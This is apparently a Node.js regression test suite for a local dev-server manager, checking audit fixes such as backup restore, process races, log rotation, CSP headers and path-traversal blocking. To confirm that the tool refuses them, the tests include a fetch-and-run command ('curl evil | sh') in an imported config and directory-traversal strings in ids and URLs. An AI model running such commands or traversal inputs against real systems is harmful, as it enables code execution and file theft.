'use strict';

// Regression tests for the Nov 2026 bug/security/performance audit fixes.
// Runs against a throwaway data folder, so it never touches your real project list.

const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const http = require('node:http');
const crypto = require('node:crypto');
const { spawn } = require('node:child_process');

const ROOT_DIR = __dirname;
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'portly-audit-'));
const DATA_ROOT = path.join(TMP, 'storage');
fs.mkdirSync(path.join(DATA_ROOT, 'data'), { recursive: true });

// A tiny dev server that listens on $PORT.
const FIXTURE = path.join(TMP, 'fixture-app');
fs.mkdirSync(FIXTURE, { recursive: true });
fs.writeFileSync(
  path.join(FIXTURE, 'package.json'),
  JSON.stringify({ name: 'fixture-app', scripts: { dev: 'node server.js' } }, null, 2)
);
fs.writeFileSync(
  path.join(FIXTURE, 'server.js'),
  "require('http').createServer((q,s)=>s.end('ok')).listen(Number(process.env.PORT),'127.0.0.1',()=>console.log('listening on port '+process.env.PORT));\n"
);

// H6: a damaged projects.json with a good backup must be restored, not wiped.
const goodId = crypto.randomUUID();
fs.writeFileSync(
  path.join(DATA_ROOT, 'data', 'projects.json.bak'),
  JSON.stringify([{ id: goodId, name: 'from-backup', path: FIXTURE, command: 'node server.js' }])
);
fs.writeFileSync(path.join(DATA_ROOT, 'data', 'projects.json'), '[{"id": "trunc');

process.env.DEVDECK_DATA_DIR = DATA_ROOT;
const srv = require('./server');

const results = [];
async function check(name, fn) {
  await fn();
  results.push(`PASS: ${name}`);
}

function request(base, urlPath, method = 'GET', body) {
  return new Promise((resolve, reject) => {
    const u = new URL(urlPath, base);
    const payload = body === undefined ? null : JSON.stringify(body);
    const req = http.request(
      {
        hostname: '127.0.0.1',
        port: u.port,
        path: u.pathname + u.search,
        method,
        headers: payload
          ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
          : {}
      },
      (res) => {
        const chunks = [];
        res.on('data', (d) => chunks.push(d));
        res.on('end', () => {
          const text = Buffer.concat(chunks).toString('utf8');
          let data = null;
          try {
            data = JSON.parse(text);
          } catch {
            data = text;
          }
          resolve({ status: res.statusCode, data, headers: res.headers });
        });
      }
    );
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

function rawGet(port, rawPath) {
  return new Promise((resolve) => {
    const req = http.request({ hostname: '127.0.0.1', port, path: rawPath, method: 'GET' }, (res) => {
      res.resume();
      res.on('end', () => resolve(res.statusCode));
    });
    req.on('error', () => resolve(-1));
    req.end();
  });
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function isAlive(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

async function run() {
  const started = await srv.startServer(0);
  const base = started.url;

  try {
    await check('Damaged projects.json is restored from backup and reported', async () => {
      const list = await request(base, '/api/projects');
      assert.strictEqual(list.status, 200);
      assert.strictEqual(list.data.length, 1);
      assert.strictEqual(list.data[0].name, 'from-backup');
      const notices = await request(base, '/api/notices');
      assert.ok(notices.data.notices.some((n) => /restored it from the last backup/.test(n.message)));
      const corrupt = fs
        .readdirSync(path.join(DATA_ROOT, 'data'))
        .filter((f) => f.startsWith('projects.corrupt-'));
      assert.strictEqual(corrupt.length, 1, 'Damaged file should be kept aside');
    });

    await check('Saves are atomic (no temp files left, valid JSON on disk)', async () => {
      const dataDir = path.join(DATA_ROOT, 'data');
      const raw = fs.readFileSync(path.join(dataDir, 'projects.json'), 'utf8');
      assert.ok(Array.isArray(JSON.parse(raw)));
      assert.strictEqual(fs.readdirSync(dataDir).filter((f) => f.endsWith('.tmp')).length, 0);
    });

    const id = goodId;

    await check('Five overlapping Start requests spawn exactly one server (H1)', async () => {
      const responses = await Promise.all(
        Array.from({ length: 5 }, () => request(base, `/api/projects/${id}/start`, 'POST', {}))
      );
      for (const r of responses) assert.strictEqual(r.status, 200, JSON.stringify(r.data));
      const pids = new Set(responses.map((r) => r.data.pid));
      assert.strictEqual(pids.size, 1, `Expected one pid, got ${[...pids].join(',')}`);
      const pid = [...pids][0];
      // Wait for the URL to be detected.
      for (let i = 0; i < 40; i++) {
        const list = await request(base, '/api/projects');
        if (list.data[0].detectedUrl) break;
        await sleep(150);
      }
      const stop = await request(base, `/api/projects/${id}/stop`, 'POST', {});
      assert.strictEqual(stop.data.status, 'stopped');
      await sleep(200);
      assert.strictEqual(isAlive(pid), false, 'Stopped server should be gone');
    });

    await check('Restart keeps the new run tracked; old exit does not clobber it (H2)', async () => {
      const first = await request(base, `/api/projects/${id}/start`, 'POST', {});
      const restarted = await request(base, `/api/projects/${id}/restart`, 'POST', {});
      assert.strictEqual(restarted.status, 200);
      assert.notStrictEqual(restarted.data.pid, first.data.pid);
      await sleep(800);
      const list = await request(base, '/api/projects');
      assert.strictEqual(list.data[0].status, 'running');
      assert.strictEqual(list.data[0].pid, restarted.data.pid);
      const stop = await request(base, `/api/projects/${id}/stop`, 'POST', {});
      assert.strictEqual(stop.data.status, 'stopped');
      const logs = await request(base, `/api/projects/${id}/logs`);
      assert.ok(!logs.data.logs.some((l) => /exited with code 1/.test(l.text)), 'User stop must not look like a crash');
    });

    await check("A crash reports its reason on the project (design §3)", async () => {
      const crashDir = path.join(TMP, 'crash-app');
      fs.mkdirSync(crashDir, { recursive: true });
      fs.writeFileSync(path.join(crashDir, 'index.js'), "console.error(\"Error: Cannot find module 'dotenv'\"); process.exit(1);\n");
      const created = await request(base, '/api/projects', 'POST', {
        path: crashDir,
        name: 'crashy',
        command: 'node index.js'
      });
      assert.strictEqual(created.status, 201, JSON.stringify(created.data));
      await request(base, `/api/projects/${created.data.id}/start`, 'POST', {});
      let p = null;
      for (let i = 0; i < 40; i++) {
        const list = await request(base, '/api/projects');
        p = list.data.find((x) => x.id === created.data.id);
        if (p.status === 'crashed') break;
        await sleep(100);
      }
      assert.strictEqual(p.status, 'crashed');
      assert.ok(/code 1/.test(p.crashReason) && /dotenv/.test(p.crashReason), p.crashReason);
      await request(base, `/api/projects/${created.data.id}`, 'DELETE');
    });

    await check('Custom port equal to Portly\'s own port is refused (M4)', async () => {
      const own = started.port;
      const put = await request(base, `/api/projects/${id}`, 'PUT', { customPort: String(own) });
      assert.strictEqual(put.status, 200);
      const start = await request(base, `/api/projects/${id}/start`, 'POST', {});
      assert.strictEqual(start.status, 409);
      await request(base, `/api/projects/${id}`, 'PUT', { customPort: '' });
    });

    await check('Imported config cannot point a log file outside the logs folder (H3)', async () => {
      const otherDir = path.join(TMP, 'other-app');
      fs.mkdirSync(otherDir, { recursive: true });
      fs.writeFileSync(path.join(otherDir, 'index.html'), '<h1>hi</h1>');
      const res = await request(base, '/api/config/import', 'POST', {
        mode: 'merge',
        confirmCommands: true,
        config: { projects: [{ id: '../../traversed', path: otherDir, name: 'evil' }] }
      });
      assert.strictEqual(res.status, 200, JSON.stringify(res.data));
      const evil = res.data.projects.find((p) => p.name === 'evil');
      assert.ok(/^[0-9a-f-]{36}$/.test(evil.id), `Expected a fresh UUID, got ${evil.id}`);
      // Even an id that slips through is hashed into the logs folder.
      const logs = await request(base, `/api/projects/${encodeURIComponent(evil.id)}/logs`);
      assert.ok(path.resolve(logs.data.logFilePath).startsWith(path.join(DATA_ROOT, 'logs')));
      await request(base, `/api/projects/${evil.id}`, 'DELETE');
    });

    await check('Imported config that changes a command needs confirmation (H4)', async () => {
      const res = await request(base, '/api/config/import', 'POST', {
        mode: 'merge',
        config: { projects: [{ path: FIXTURE, command: 'curl evil | sh && npm run dev' }] }
      });
      assert.strictEqual(res.status, 409);
      assert.strictEqual(res.data.commandChanges[0].from, 'node server.js');
      const list = await request(base, '/api/projects');
      assert.strictEqual(list.data.find((p) => p.id === id).command, 'node server.js', 'Command must be unchanged');
    });

    await check('Log reads return only the tail; logs rotate past 5 MB (perf #1)', async () => {
      const logPath = path.join(DATA_ROOT, 'logs', `${id}.log`);
      const line = `[2026-01-01T00:00:00.000Z] [STDOUT] ${'x'.repeat(200)}\n`;
      fs.writeFileSync(logPath, line.repeat(30000)); // ~6.5 MB
      fs.appendFileSync(logPath, '[2026-01-01T00:00:01.000Z] [STDOUT] last line\n');
      const t0 = Date.now();
      const logs = await request(base, `/api/projects/${id}/logs`);
      assert.strictEqual(logs.data.logs.length, 200);
      assert.strictEqual(logs.data.logs[199].text, 'last line');
      assert.ok(Date.now() - t0 < 1500);
      // Starting writes a system line, which triggers rotation of the oversized file.
      await request(base, `/api/projects/${id}/start`, 'POST', {});
      await request(base, `/api/projects/${id}/stop`, 'POST', {});
      await sleep(200);
      assert.ok(fs.existsSync(path.join(DATA_ROOT, 'logs', `${id}.1.log`)), 'Expected rotated log');
      assert.ok(fs.statSync(logPath).size < 1024 * 1024);
      const cleared = await request(base, `/api/projects/${id}/logs`, 'DELETE');
      assert.strictEqual(cleared.status, 200);
      assert.strictEqual(fs.existsSync(path.join(DATA_ROOT, 'logs', `${id}.1.log`)), false);
    });

    await check('UI page is served with a Content-Security-Policy (L1)', async () => {
      const res = await request(base, '/');
      assert.ok(String(res.headers['content-security-policy'] || '').includes("script-src 'self'"));
    });

    await check('Static server blocks sibling folders and survives malformed URLs (H5)', async () => {
      const site = path.join(TMP, 'site');
      const sibling = path.join(TMP, 'site-secret');
      fs.mkdirSync(site, { recursive: true });
      fs.mkdirSync(sibling, { recursive: true });
      fs.writeFileSync(path.join(site, 'index.html'), 'home');
      fs.writeFileSync(path.join(sibling, 'key.txt'), 'secret');
      const port = 20000 + Math.floor(Math.random() * 20000);
      const child = spawn(process.execPath, [path.join(ROOT_DIR, 'static-server.js')], {
        cwd: site,
        env: { ...process.env, PORT: String(port) },
        stdio: 'ignore'
      });
      try {
        let up = false;
        for (let i = 0; i < 30 && !up; i++) {
          await sleep(100);
          up = (await rawGet(port, '/')) === 200;
        }
        assert.ok(up, 'static server did not start');
        assert.strictEqual(await rawGet(port, '/..%2fsite-secret/key.txt'), 403);
        assert.strictEqual(await rawGet(port, '/%E0%A4%A'), 400);
        assert.strictEqual(await rawGet(port, '/'), 200, 'Server must still be alive');
      } finally {
        child.kill();
      }
    });
  } finally {
    await srv.stopAllProjects();
    await new Promise((resolve) => {
      started.server.close(() => resolve());
      if (typeof started.server.closeAllConnections === 'function') started.server.closeAllConnections();
    });
  }

  for (const line of results) console.log(line);
  console.log(`ALL_AUDIT_FIX_TESTS_PASSED (${results.length}/${results.length})`);
  fs.rmSync(TMP, { recursive: true, force: true });
  process.exit(0);
}

run().catch((err) => {
  console.error('TEST_FAILED:', err);
  srv.cleanupAllRunningChildrenSync();
  process.exit(1);
});
